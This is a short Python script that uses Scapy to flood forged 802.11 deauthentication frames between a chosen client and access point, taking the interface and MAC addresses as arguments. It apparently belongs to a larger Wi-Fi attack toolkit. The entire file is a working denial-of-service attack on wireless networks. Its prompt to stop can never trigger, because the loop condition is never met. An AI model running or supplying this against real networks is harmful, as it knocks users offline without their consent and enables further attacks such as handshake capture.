from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Deauth
from attack_manager import do_command

sniffer_interface = sys.argv[1]
target_mac = sys.argv[2]
client_mac = sys.argv[3]


# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC

print("attaching client mac:", client_mac)

for y in range(1,4):
    # sending fake packets  in two directions : AP -> client , client -> AP
    pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
    pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
    for _ in range(50):
        print("sending death packets...")
        sendp(pkt1, iface=sniffer_interface, count=20)
        sendp(pkt2, iface=sniffer_interface, count=20)
        if y % 30 == 0:
            press = input("press p to stop, otherwise any\n")
            if press == 'p':
                print("#  Goodbye  #")
                break

